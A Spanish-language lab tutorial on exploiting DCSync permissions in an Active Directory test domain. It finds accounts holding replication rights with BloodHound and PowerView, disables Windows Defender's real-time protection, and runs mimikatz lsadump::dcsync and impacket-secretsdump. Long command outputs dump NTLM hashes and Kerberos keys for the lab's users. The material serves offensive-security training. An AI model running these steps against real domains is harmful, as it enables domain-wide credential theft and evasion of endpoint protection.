---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Explotación DCSync

Este tipo de permisos consiste en lo siguiente...

Si nosotros por ejemplo tenemos mas de un `DC` en la empresa y uno se cae por algun motivo tendremos otro que respalde a ese primer `DC` en cual podremos comunicarnos con el desde otro `DC` distinto sin necesidad de estar dentro de el y esto `Microsoft` nos proporciona un protocolo en especifico que nos permite este tipo de comunicacion desde un `DC` a otro, entonces este ataque `DCSync` va precisamente de esto aprovechar esto privilegios en concreto para hacer peticiones como si fuesemos otro `DC` y que el `DC` original nos mande informacion sobre todo relativa a los usuarios que tiene en esa base de datos `NTDS.dir`

Este tipo de informacion no se podra obtener con las tecnicas de recopilacion de informacion como un usuario normal, pero si, si tenemos el permiso del `DCSync`.

Por lo que en `BloodHound` vamos a buscar por la siguiente `Query`:

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Y veremos algo asi:

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Si seleccionamos por ejemplo el usuario `Angelika` vemos que tiene una linea llamada `DCSync` la cual si le damos a su `help` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Tenemos los privilegios del permiso `GetChargues` que es el necesario para poder realizar un ataque de `DCSync` y en la parte de `Windows Abuse` te pone que comandos a seguir para realizar este ataque.

Como vemos `angelika` no tiene privilegios de ningun tipo, pero por tener permiso a este `DCSync` podremos explotarlo de la siguiente forma:

### Identificación de permiso `DCSync` por BloodHound

Pero antes de realizarlo, podremos identificar de la misma forma que lo hacemos con `BloodHound` en `PowerView` los ususarios que tienen este permiso de `DCSync`.

Abrimos un `PowerShell` en el equipo del `empleado1`:

```powershell
cd .\Desktop
. .\new_powerview.ps1
Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"} | select ObjectDN,ObjectAceType, @{name="Name";expression={Convert-SidToName $_.SecurityIdentifier}}
```

Info:

```
ObjectDN         ObjectAceType                              Name
--------         -------------                              ----
DC=corp,DC=local DS-Replication-Get-Changes-In-Filtered-Set CORP\lonnie.betti
DC=corp,DC=local DS-Replication-Get-Changes-In-Filtered-Set CORP\angelika.shelly
DC=corp,DC=local DS-Replication-Get-Changes-In-Filtered-Set CORP\cynthie.rori
DC=corp,DC=local DS-Replication-Get-Changes                 CORP\lonnie.betti
DC=corp,DC=local DS-Replication-Get-Changes                 CORP\angelika.shelly
DC=corp,DC=local DS-Replication-Get-Changes                 CORP\cynthie.rori
DC=corp,DC=local DS-Replication-Get-Changes                 CORP\Enterprise Read-only Domain Controllers
DC=corp,DC=local DS-Replication-Get-Changes-All             CORP\Domain Controllers
DC=corp,DC=local DS-Replication-Get-Changes-All             CORP\lonnie.betti
DC=corp,DC=local DS-Replication-Get-Changes-All             CORP\angelika.shelly
DC=corp,DC=local DS-Replication-Get-Changes-All             CORP\cynthie.rori
DC=corp,DC=local DS-Replication-Get-Changes-In-Filtered-Set BUILTIN\Administrators
DC=corp,DC=local DS-Replication-Get-Changes                 BUILTIN\Administrators
DC=corp,DC=local DS-Replication-Get-Changes-All             BUILTIN\Administrators
DC=corp,DC=local DS-Replication-Get-Changes-In-Filtered-Set Enterprise Domain Controllers
DC=corp,DC=local DS-Replication-Get-Changes                 Enterprise Domain Controllers
CN=Builtin,DC... DS-Replication-Get-Changes                 CORP\Enterprise Read-only Domain Controllers
CN=Builtin,DC... DS-Replication-Get-Changes-All             CORP\Domain Controllers
CN=Builtin,DC... DS-Replication-Get-Changes-In-Filtered-Set BUILTIN\Administrators
CN=Builtin,DC... DS-Replication-Get-Changes                 BUILTIN\Administrators
CN=Builtin,DC... DS-Replication-Get-Changes-All             BUILTIN\Administrators
CN=Builtin,DC... DS-Replication-Get-Changes-In-Filtered-Set Enterprise Domain Controllers
CN=Builtin,DC... DS-Replication-Get-Changes                 Enterprise Domain Controllers
```

Y con esto podremos ver quienes tiene ese permiso de `DCSync` para poder realizar este tipo de ataques.

Por lo que vamos a realizar este ataque con el usuario `Angelika` vamos a suponer que hemos comprometido al dicho usuario, por lo que vamos desde el `DC` a resetear la contraseña de `Angelika` poniendola una contraseña `Passw0rd6`.

### Realización de técnica mediante `Mimikatz`

Vamos hacerlo con una herramienta muy famosa llamada `mimikatz` aunque tambien muy detectada por herramientas de seguridad, por lo que no es muy recomendable, pero para ver diferentes forma veremos la de con la herramienta `mimikatz`.

Vamos a cerrar sesion en el equipo y nos vamos a logear directamente con `Angelika` para tener un entorno grafico y asi que no sea tan tedioso el echo de pasarnos el binario, etc...

Por lo que cerraremos sesion -> abajo a la izquierda le daremos a `Otro usuario` -> pondremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Le damos a `ENTER` y nos habra iniciado sesion en el dominio del `DC01` con dicho usuario que esta creado ya en el dominio.

Una vez que estemos dentro tendremos que pasarnos el binario de `mimikatz` al escritorio.

Nos iremos a nuestro `kali` para descargarnos `mimikatz` desde `kali` y pasarnoslo al equipo de `Windows`.

En el `Firefox` de `kali` buscaremos el siguiente repositorio que dejare el link:

URL = [Mimikatz GitHub Windows EXE](https://github.com/gentilkiwi/mimikatz/releases)

Nos descargaremos el llamado `mimikatz_trunk.zip` la descomprimimos y nos metemos dentro de ella, nos iremos a `mimikatz_trunk/x64/` dentro de esta ruta veremos el ejecutable llamado `mimikatz.exe` el cual nos tendremos que pasar al equipo de `Windows`.

Vamos abrir un servidor de `python3` en esa ruta para pasarnos el binario a la otra maquina de la siguiente forma:

> Kali Linux

```shell
cd Downloads/mimikatz_trunk/x64
python3 -m http.server
```

> Windows

```powershell
cd .\Desktop
(New-Object System.NET.WebClient).DownloadFile("http://<IP>:8000/mimikatz.exe", "mimikatz.exe")
```

Si nosotros ejecutamos eso lo que va a pasar es que nos lo va a detectar el `Windows Defender` y nos lo va a eliminar automaticamente.

Mas adelante veremos a como evadir todas estas medidas de seguridad para que no nos lo detecte ninguna herramienta de seguridad, pero como en este caso no toca ver eso todavia, desactivaremos el `Windows Defender` solamente para ver como seria hacerlo con la herramienta `mimikatz.exe`.

Una vez que hayamos desactivado el `Tiempo real` del `Windows Defender`:

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Podremos volver a ejecutar el comando sin problemas y esto nos lo descargara.

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### Dumpeo de hashes NTLM mediante el permiso `DCSync` con `Mimikatz`

Por lo que todo por `PowerShell` vamos a ejecutar `mimikatz`:

```powershell
.\mimikatz.exe
```

Info:

```
 .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Por lo que vamos hacer lo siguiente para explotar este permiso de `DCSync` haciendo esto para sacarle informacion del usuario `Administrador`:

```powershell
lsadump::dcsync /user:corp\administrator
```

Info:

```
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'corp\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 1:00:00
Password last change : 05/01/2025 11:27:27
Object Security ID   : S-1-5-21-3352250647-938130414-2449934813-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a87f3a337d73085c45f9416be5787d86

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0201bb5c16a343b72644f0a095ab60d8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-VTVIM0M8QM9Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : db7e98b663293b6af815f7c70cc8b33ca68cb4b01039b768e24c1823fdf762cd
      aes128_hmac       (4096) : 522885e189a3ac354bb3eb96555a925e
      des_cbc_md5       (4096) : e5fe3e38629eb5f1

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-VTVIM0M8QM9Administrator
    Credentials
      des_cbc_md5       : e5fe3e38629eb5f1
```

Por lo que vemos hemos sido capaces de volcar el `hash` `NTLM` del usuario `Administrador`.

```
Hash NTLM: a87f3a337d73085c45f9416be5787d86
```

Y con esto podriamos volcar todos los `hashes` de todos los usuarios que queramos.

Pero nosotros podremos ejecutar esto mismo de forma remota desde nuestro `kali` utilizando la herramienta `impaket` de la siguiente forma:

```shell
impacket-secretsdump -just-dc angelika.shelly:"Passw0rd6"@192.168.5.5
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f6f27ccbcb235da4602454dff0efb47:::
empleado1:1104:aad3b435b51404eeaad3b435b51404ee:1791df33b45987df23e4fe6c57ea6de7:::
empleado2:1105:aad3b435b51404eeaad3b435b51404ee:8a499ecf99c5e069d0458e283a4b6e89:::
corp.local\maurine.bibby:1112:aad3b435b51404eeaad3b435b51404ee:d82921ed22040dd71155e8a03243313c:::
corp.local\henrie.kaleena:1113:aad3b435b51404eeaad3b435b51404ee:42debef78d775b12665a4b46c2bc0d85:::
corp.local\ali.alix:1114:aad3b435b51404eeaad3b435b51404ee:c22c6b98762554faa8c2d3680aff333c:::
corp.local\saree.dayna:1115:aad3b435b51404eeaad3b435b51404ee:efa5e0c10d32966787dd18e84d2909ad:::
corp.local\lonnie.betti:1116:aad3b435b51404eeaad3b435b51404ee:decaa0eb115a118d7ffcb6935b44f90c:::
corp.local\abbi.jocelyn:1117:aad3b435b51404eeaad3b435b51404ee:145d5b1f825b6cb90bebca4363e898a7:::
corp.local\arlie.gunilla:1118:aad3b435b51404eeaad3b435b51404ee:f8769dfb45a9666a852b133266f21864:::
corp.local\adorne.bridgette:1119:aad3b435b51404eeaad3b435b51404ee:1b5fd36fd806997ad2e1f5ac2c37155b:::
corp.local\roanna.bidget:1120:aad3b435b51404eeaad3b435b51404ee:512f8859e2284eb641fa3314363b0e95:::
corp.local\aubry.carolan:1121:aad3b435b51404eeaad3b435b51404ee:7a1ff9e224d141913d9bd0528dc911de:::
corp.local\ermina.hatti:1122:aad3b435b51404eeaad3b435b51404ee:26b38023e898f4ecfa2a64a5f71e5b88:::
corp.local\angelika.shelly:1123:aad3b435b51404eeaad3b435b51404ee:57026964e43061cd0b85dd283007a977:::
corp.local\barby.min:1124:aad3b435b51404eeaad3b435b51404ee:973d105f2998e2de4bde818f1886d759:::
corp.local\jannel.emalia:1125:aad3b435b51404eeaad3b435b51404ee:ff5acca13f8bd31e07812546af155d32:::
corp.local\audre.maible:1126:aad3b435b51404eeaad3b435b51404ee:0cb6948805f797bf2a82807973b89537:::
corp.local\kizzie.kacy:1127:aad3b435b51404eeaad3b435b51404ee:ecce75a9fb45017ffbb7159d995427ff:::
corp.local\andreana.shea:1128:aad3b435b51404eeaad3b435b51404ee:dc744ed921c9e3e9057bcd0bb46f1f67:::
corp.local\emeline.shirline:1129:aad3b435b51404eeaad3b435b51404ee:6df283e7ab68f35bc71b133ca6d7cea7:::
corp.local\brynne.kenon:1130:aad3b435b51404eeaad3b435b51404ee:d539b17d09f4fe15a7bad9abd1848530:::
corp.local\myrtia.agatha:1131:aad3b435b51404eeaad3b435b51404ee:caefbf5e98f0665d91f60cb891d4e0a2:::
corp.local\ernaline.lowell:1132:aad3b435b51404eeaad3b435b51404ee:e163083ebb3b9d5f41596015340ca2de:::
corp.local\gerri.kathi:1133:aad3b435b51404eeaad3b435b51404ee:329aa1d438e9dd14417652123c1833bd:::
corp.local\goldarina.nicki:1134:aad3b435b51404eeaad3b435b51404ee:d6a0278c47671ae9d88618838a6c5c8f:::
corp.local\avril.cheri:1135:aad3b435b51404eeaad3b435b51404ee:f1e3db4726eba32334a63617e202b9c9:::
corp.local\bobette.glenn:1136:aad3b435b51404eeaad3b435b51404ee:735eb28423eba3a3f4537dd2c3572234:::
corp.local\joanie.karine:1137:aad3b435b51404eeaad3b435b51404ee:44f708fd7d1a1e32447b9f85a03bc95d:::
corp.local\gwenneth.gilly:1138:aad3b435b51404eeaad3b435b51404ee:6913afed0a5f8adb556088efc74ad835:::
corp.local\saidee.kaye:1139:aad3b435b51404eeaad3b435b51404ee:9547d7beb0a0db11fcc8d89785cade7d:::
corp.local\cynthie.rori:1140:aad3b435b51404eeaad3b435b51404ee:c33c96404665124fda06f02df8582b60:::
corp.local\cristabel.melony:1141:aad3b435b51404eeaad3b435b51404ee:9c7b0920b5f3f3b3a5330e159ade9ec4:::
corp.local\mela.jacquetta:1142:aad3b435b51404eeaad3b435b51404ee:63e93231f29e6da36cb61a1b58d3cd84:::
corp.local\jennifer.gerry:1143:aad3b435b51404eeaad3b435b51404ee:1b5fd36fd806997ad2e1f5ac2c37155b:::
corp.local\ginevra.michel:1144:aad3b435b51404eeaad3b435b51404ee:0c2e59196f7e1bc1210d7373d3001b73:::
corp.local\arabella.norry:1145:aad3b435b51404eeaad3b435b51404ee:17f87f2b10a2b91bfdcde0f325b82621:::
corp.local\colly.katey:1146:aad3b435b51404eeaad3b435b51404ee:944cf91a32a62b083b2e7e05bc3ff31f:::
corp.local\marsha.jordan:1147:aad3b435b51404eeaad3b435b51404ee:cd401a40ae92face50b8e4fe1911060e:::
corp.local\britni.henrieta:1148:aad3b435b51404eeaad3b435b51404ee:4e99cbf872b5ea45f544ef96e08bb594:::
corp.local\alejandrina.faye:1149:aad3b435b51404eeaad3b435b51404ee:c0d59d3d1fb78f2254b6a5e1e232a11e:::
corp.local\philis.bertha:1150:aad3b435b51404eeaad3b435b51404ee:c307f530d4b2ebe831fe4e2491f3975d:::
corp.local\harriett.daron:1151:aad3b435b51404eeaad3b435b51404ee:27993b367730ea69d313e08d1faaaacc:::
corp.local\ardine.farra:1152:aad3b435b51404eeaad3b435b51404ee:579fabc1a3e74b8105996ab302a2af17:::
corp.local\robena.prudence:1153:aad3b435b51404eeaad3b435b51404ee:800a576449e7783f5b174261f140d78e:::
corp.local\pearl.judye:1154:aad3b435b51404eeaad3b435b51404ee:3b4c1cfd1368b8215322a587ed196672:::
corp.local\riva.nellie:1155:aad3b435b51404eeaad3b435b51404ee:2b26d657dc7130d83a5dc60cc208fdf3:::
corp.local\jobina.aleta:1156:aad3b435b51404eeaad3b435b51404ee:e29b551915cef13f7da3c4da4f70848d:::
corp.local\fayina.hyacinth:1157:aad3b435b51404eeaad3b435b51404ee:aa37dc82c4ff251e748025ebf207f77b:::
corp.local\loretta.jerrine:1158:aad3b435b51404eeaad3b435b51404ee:cd5ce254277eb2aa639970ddd6a990ce:::
corp.local\peta.adelind:1159:aad3b435b51404eeaad3b435b51404ee:814d248c380637ce28c49106e954b6e7:::
corp.local\ophelie.odele:1160:aad3b435b51404eeaad3b435b51404ee:1c6c1416ccdc3c9370d48c2451876aba:::
corp.local\cybil.alica:1161:aad3b435b51404eeaad3b435b51404ee:769043dc0b75e3b135aed2a3488b9d04:::
corp.local\shay.siana:1162:aad3b435b51404eeaad3b435b51404ee:3f3cf12cb66dc55b3419663db8c75506:::
corp.local\halette.martelle:1163:aad3b435b51404eeaad3b435b51404ee:9e2f512e853d6626483ee1c70c2c7598:::
corp.local\audrey.hedwiga:1164:aad3b435b51404eeaad3b435b51404ee:9fcda556285c0ca547f03ffab2cf25c4:::
corp.local\betsey.stephine:1165:aad3b435b51404eeaad3b435b51404ee:dc32411a0ebda4a2361d4ca418b0252a:::
corp.local\demetris.daveta:1166:aad3b435b51404eeaad3b435b51404ee:d3cadfc9d096e4f776cec4f4c951a4d3:::
corp.local\lexy.rosaline:1167:aad3b435b51404eeaad3b435b51404ee:b25db601b196b205fb8cf069c2250e01:::
corp.local\ilyssa.nevsa:1168:aad3b435b51404eeaad3b435b51404ee:b0e2196ade5b0c07300201d658363067:::
corp.local\denice.freda:1169:aad3b435b51404eeaad3b435b51404ee:d5a1ff41eb2b860f9536d2d86550789c:::
corp.local\georgia.marie-ann:1170:aad3b435b51404eeaad3b435b51404ee:36186b9c0df358fa6bb0035297bdabf4:::
corp.local\benny.alikee:1171:aad3b435b51404eeaad3b435b51404ee:bcdb5312717d84dd6e4b9cca27617249:::
corp.local\sandye.leodora:1172:aad3b435b51404eeaad3b435b51404ee:6b3d82133d20b6ccdfcad26842a5704a:::
corp.local\germain.gavrielle:1173:aad3b435b51404eeaad3b435b51404ee:1b5fd36fd806997ad2e1f5ac2c37155b:::
corp.local\milicent.gracie:1174:aad3b435b51404eeaad3b435b51404ee:412807efcbd87605170a1dc7eaacc739:::
corp.local\meg.carolee:1175:aad3b435b51404eeaad3b435b51404ee:76ce4f085c523050bb556a271cedfc77:::
corp.local\linn.evaleen:1176:aad3b435b51404eeaad3b435b51404ee:f4c5cfb055a2388812221883fa36ae09:::
corp.local\mirna.annice:1177:aad3b435b51404eeaad3b435b51404ee:e77a68e82f9f90989f5c72ffb66ac8a6:::
corp.local\diana.sharai:1178:aad3b435b51404eeaad3b435b51404ee:9a6b336ee783fc1f2fd1937382ffcae8:::
corp.local\deeann.amalita:1179:aad3b435b51404eeaad3b435b51404ee:65280abfc80276e980264c76b0be1d55:::
corp.local\kettie.shanta:1180:aad3b435b51404eeaad3b435b51404ee:d70163504ea0d226a03ddc73aca9e73c:::
corp.local\estelle.kelli:1181:aad3b435b51404eeaad3b435b51404ee:257137e2fa6113a73a575456e5a48d77:::
corp.local\guenna.jessi:1182:aad3b435b51404eeaad3b435b51404ee:1b5fd36fd806997ad2e1f5ac2c37155b:::
corp.local\allissa.lezlie:1183:aad3b435b51404eeaad3b435b51404ee:2011b17f63f6a3a71681eb35c2eb0c8a:::
corp.local\crissie.deena:1184:aad3b435b51404eeaad3b435b51404ee:7116e39f01b02b9386ff71802326dba4:::
corp.local\olga.rhoda:1185:aad3b435b51404eeaad3b435b51404ee:2db70bd01bf5e91a9fa5c436f8aebd45:::
corp.local\anna.costanza:1186:aad3b435b51404eeaad3b435b51404ee:06e299687bd4e74a5a9d0173666e1a04:::
corp.local\corie.josie:1187:aad3b435b51404eeaad3b435b51404ee:57c5a5bc7c0e1f98e9c9d81161e74c44:::
corp.local\evy.britta:1188:aad3b435b51404eeaad3b435b51404ee:ec1b05de0565ed26bdf542c2093c5886:::
corp.local\jaime.luise:1189:aad3b435b51404eeaad3b435b51404ee:070fc13cc9ee3aa820754edd1a40c779:::
corp.local\gennifer.cleo:1190:aad3b435b51404eeaad3b435b51404ee:7090b644c333051f506b221d255f1d6f:::
corp.local\colly.elfie:1191:aad3b435b51404eeaad3b435b51404ee:3ad4c1dd45dd49341b74ebe44b93e7e7:::
corp.local\gill.kellie:1192:aad3b435b51404eeaad3b435b51404ee:07e07fbc450536d4195472717e641944:::
corp.local\carmon.leoine:1193:aad3b435b51404eeaad3b435b51404ee:7d102aec17baf6bce5ec2b18b9f615e5:::
corp.local\farrand.inna:1194:aad3b435b51404eeaad3b435b51404ee:81132b99459a2935de7351a952e35a6f:::
corp.local\donnie.lari:1195:aad3b435b51404eeaad3b435b51404ee:7a1cbcab136c4f17da319306ebac97fe:::
corp.local\millie.hanny:1196:aad3b435b51404eeaad3b435b51404ee:a93bf1e7516a705a02cf7b4c32683487:::
corp.local\sarita.alisha:1197:aad3b435b51404eeaad3b435b51404ee:abf61539c6bc83cedb49e6c34bc1ce49:::
corp.local\rycca.jacinta:1198:aad3b435b51404eeaad3b435b51404ee:c46b058c4ba5c080ed3f1abf7c16519b:::
corp.local\levin.bab:1199:aad3b435b51404eeaad3b435b51404ee:8a9016622fb40478eebcfd2b4cea5407:::
corp.local\celle.sherye:1200:aad3b435b51404eeaad3b435b51404ee:57c5a5bc7c0e1f98e9c9d81161e74c44:::
corp.local\chloris.ilysa:1201:aad3b435b51404eeaad3b435b51404ee:13c03d7dc3d7c879c700b39a3e908d5f:::
corp.local\kelley.happy:1202:aad3b435b51404eeaad3b435b51404ee:5a7f089d3180b5b20642514a05858e66:::
corp.local\darsey.jasmine:1203:aad3b435b51404eeaad3b435b51404ee:8263a8cfd117ea7321ce70b8ea0ae641:::
corp.local\ebba.nicoline:1204:aad3b435b51404eeaad3b435b51404ee:572731a0b0e87c48263280a097f6b90a:::
corp.local\geneva.lorrin:1205:aad3b435b51404eeaad3b435b51404ee:3d2897de15ac1afcfadef3419d6b6fe0:::
corp.local\joellyn.pippa:1206:aad3b435b51404eeaad3b435b51404ee:ba368bde714bc1998bf9e70083ad036b:::
corp.local\renelle.jacynth:1207:aad3b435b51404eeaad3b435b51404ee:111c29282028ef4b776967831da80da2:::
corp.local\sarah.rhoda:1208:aad3b435b51404eeaad3b435b51404ee:7b77128bc816cfe6cc7ef2fe93f8f695:::
corp.local\annice.mable:1209:aad3b435b51404eeaad3b435b51404ee:69f88de676b2882ceaab46e3b7fcd43f:::
corp.local\aimil.evangelia:1210:aad3b435b51404eeaad3b435b51404ee:1b5fd36fd806997ad2e1f5ac2c37155b:::
DC01$:1001:aad3b435b51404eeaad3b435b51404ee:0a293c84079cceb0350201b4477561f3:::
WS01$:1106:aad3b435b51404eeaad3b435b51404ee:afc5c02d936d73808ce716070e883ab8:::
WS02$:1107:aad3b435b51404eeaad3b435b51404ee:333f41af430f02cb557c022ba769821e:::
exchange_svc$:1219:aad3b435b51404eeaad3b435b51404ee:d109d4b749aba95d12042dcdbd8add2d:::
mssql_svc$:1220:aad3b435b51404eeaad3b435b51404ee:54b9271451dfc0efcbb5e12b33fafc85:::
http_svc$:1221:aad3b435b51404eeaad3b435b51404ee:158158da17ce5eec80fa48b8d2219e41:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db7e98b663293b6af815f7c70cc8b33ca68cb4b01039b768e24c1823fdf762cd
Administrator:aes128-cts-hmac-sha1-96:522885e189a3ac354bb3eb96555a925e
Administrator:des-cbc-md5:e5fe3e38629eb5f1
krbtgt:aes256-cts-hmac-sha1-96:6a72c424a9f7b05de8e41c4afa23bedb9bd85eafe5ae54fd772fe0b230e6c415
krbtgt:aes128-cts-hmac-sha1-96:5df53d9182aadcaa60504f88032bf08f
krbtgt:des-cbc-md5:790e796e0ddaa1ce
empleado1:aes256-cts-hmac-sha1-96:0fb09c66d747b41162bc91719f4131179a0203c2152bd3ea96ef1a394f981775
empleado1:aes128-cts-hmac-sha1-96:c12e0ce68972269ec88cfcfdb1dcf17b
empleado1:des-cbc-md5:df7ca11ac2e6b6d5
empleado2:aes256-cts-hmac-sha1-96:eada5ff71432de7b785c8bd29cfc02042871f180dfad75a819f2c305f994e3fd
empleado2:aes128-cts-hmac-sha1-96:4d7ed5e3de7f8eb8ec9113a7ecaf4d61
empleado2:des-cbc-md5:c180087f081304a8
corp.local\maurine.bibby:aes256-cts-hmac-sha1-96:30ca19a1cacdd2b7bcc9ca046fceadaf1b10d72d4820ab774487f6c4802ff731
corp.local\maurine.bibby:aes128-cts-hmac-sha1-96:7fd841ce8c4e72c89e7ba541ea484fdf
corp.local\maurine.bibby:des-cbc-md5:20b92a57c2580d15
corp.local\henrie.kaleena:aes256-cts-hmac-sha1-96:0f8c1663af410a87879fdda391525294eb500992dbb7ad6b22f484a28d982909
corp.local\henrie.kaleena:aes128-cts-hmac-sha1-96:c67501149c2c3a424864a6c0e2ae874a
corp.local\henrie.kaleena:des-cbc-md5:40e6c740c443a8fd
corp.local\ali.alix:aes256-cts-hmac-sha1-96:754afd9944bddf69e0bbc7a149d520db400e86914fbaa34880f6b5f138dcf21d
corp.local\ali.alix:aes128-cts-hmac-sha1-96:4977fa12798c80afc7182f5c86012a6d
corp.local\ali.alix:des-cbc-md5:1c7c7689cee0518f
corp.local\saree.dayna:aes256-cts-hmac-sha1-96:4ebbc9565977d68febacc113fb84b956b64abc03a0d7821faf01d007c0150cca
corp.local\saree.dayna:aes128-cts-hmac-sha1-96:e747da277ab691646ba4dc369639784c
corp.local\saree.dayna:des-cbc-md5:5b914a25dfcbb9a7
corp.local\lonnie.betti:aes256-cts-hmac-sha1-96:42345fc844c95929b0e0f334403d8f5a5e8501f9d65d9343a509356cbe318a06
corp.local\lonnie.betti:aes128-cts-hmac-sha1-96:1f721eb455429080554c958fe4e35101
corp.local\lonnie.betti:des-cbc-md5:b6dfd94604083e5d
corp.local\abbi.jocelyn:aes256-cts-hmac-sha1-96:a9b95d300ca4b1586e8796163a679b48f0c4b20e28b9f9113cf14654aa346016
corp.local\abbi.jocelyn:aes128-cts-hmac-sha1-96:1158844d5ad773571a102c436c064cc7
corp.local\abbi.jocelyn:des-cbc-md5:a4195431c1cd5840
corp.local\arlie.gunilla:aes256-cts-hmac-sha1-96:ed0cdd2da9f4d460c121980c83c3454cf7d7983d1c10a0c12cecbd19297916f1
corp.local\arlie.gunilla:aes128-cts-hmac-sha1-96:c2a3369ee011013094314c3ed6783154
corp.local\arlie.gunilla:des-cbc-md5:7551326b6b404f8a
corp.local\adorne.bridgette:aes256-cts-hmac-sha1-96:464eda2e38d80e6d0f3cfff3807027eb49a62148f1701dd4b48a6b4a7feb92e2
corp.local\adorne.bridgette:aes128-cts-hmac-sha1-96:15f018bab175f8360ab89f84eb07c6a5
corp.local\adorne.bridgette:des-cbc-md5:203419e9587516c1
corp.local\roanna.bidget:aes256-cts-hmac-sha1-96:0f101c0849eb764e5b44c9a98cc3e5ef2c8dc539ee16ca6618a98556f00aaa77
corp.local\roanna.bidget:aes128-cts-hmac-sha1-96:e3a26dadff44f874a4dc274fb8622e60
corp.local\roanna.bidget:des-cbc-md5:4a133749f2671a62
corp.local\aubry.carolan:aes256-cts-hmac-sha1-96:3efeb1bf82f901e35ded971db09a5f0303b6880ca1c4b2d2fe0e6d63ad7eada1
corp.local\aubry.carolan:aes128-cts-hmac-sha1-96:167c16a10df0df893cff2dd72b5d8616
corp.local\aubry.carolan:des-cbc-md5:b53b856b98975e9d
corp.local\ermina.hatti:aes256-cts-hmac-sha1-96:4dabd785cda4fbfd8d831193890bc9534af49b8e182de6318ec4a851dcf80b9b
corp.local\ermina.hatti:aes128-cts-hmac-sha1-96:315ff1ccd914d43666f65327443b3a53
corp.local\ermina.hatti:des-cbc-md5:a22fa4cd7c5d2540
corp.local\angelika.shelly:aes256-cts-hmac-sha1-96:4b677f18196e7a340bd12cc3b8c8bdaa1851f4389738a7962ce47fa14f139db1
corp.local\angelika.shelly:aes128-cts-hmac-sha1-96:9e7a4c91a4474cced5e4d785916c414f
corp.local\angelika.shelly:des-cbc-md5:3b756d3d89496b29
corp.local\barby.min:aes256-cts-hmac-sha1-96:7ad7827834f175502b004577ee6013695b537494b8b5409f2aec76749342cfd1
corp.local\barby.min:aes128-cts-hmac-sha1-96:db1e7720bc732176e92f59ab5b62af24
corp.local\barby.min:des-cbc-md5:c28f26a7fedfb949
corp.local\jannel.emalia:aes256-cts-hmac-sha1-96:2927019b67a6170865fa3d9a98d6271aec038179b92a34a714c186d46c873b30
corp.local\jannel.emalia:aes128-cts-hmac-sha1-96:10dd561c6dc1df3f1102d93da399dd10
corp.local\jannel.emalia:des-cbc-md5:705e2c5d078586c8
corp.local\audre.maible:aes256-cts-hmac-sha1-96:5345f93fa95a187c60c63cc4197407fc88432789e94632e210bde5f173f399f5
corp.local\audre.maible:aes128-cts-hmac-sha1-96:54daa84744d485431097c937990787fa
corp.local\audre.maible:des-cbc-md5:92bab362a8759ed9
corp.local\kizzie.kacy:aes256-cts-hmac-sha1-96:8a058ae7985916deb1d56c519e0dd02b66bb5e36e0c6d47a625c00cffed2132b
corp.local\kizzie.kacy:aes128-cts-hmac-sha1-96:0df4a2fde0637425143fde0d9d838385
corp.local\kizzie.kacy:des-cbc-md5:4fd56483fb5820c4
corp.local\andreana.shea:aes256-cts-hmac-sha1-96:c2b0f058bbc606b5a975d124dc0cd81f3874e3b209cb5154e1208bf24b90f357
corp.local\andreana.shea:aes128-cts-hmac-sha1-96:7acffb67b3a41887dda2227ed41fa72a
corp.local\andreana.shea:des-cbc-md5:9246d92592378a98
corp.local\emeline.shirline:aes256-cts-hmac-sha1-96:4b7d76460e19899db15edaac34653977279b3b1047874188694ec7e8fbb13cb8
corp.local\emeline.shirline:aes128-cts-hmac-sha1-96:b030563df5c27da79df72ede24bab48b
corp.local\emeline.shirline:des-cbc-md5:38584a79f462861c
corp.local\brynne.kenon:aes256-cts-hmac-sha1-96:14f8ddba791b6d10386fc505511a6b7eb48ab7620df484156638430d01842529
corp.local\brynne.kenon:aes128-cts-hmac-sha1-96:7b25fca64c7bf3a80183c95a8b454deb
corp.local\brynne.kenon:des-cbc-md5:349be5b0c4b6f2a4
corp.local\myrtia.agatha:aes256-cts-hmac-sha1-96:6612ae047e37347ab11ea9731c1d5c35e9e25c2ae8399e9b989cc59bd538f76d
corp.local\myrtia.agatha:aes128-cts-hmac-sha1-96:c283777e1da909caa27bbc31ff921036
corp.local\myrtia.agatha:des-cbc-md5:75526d9257b9f8cb
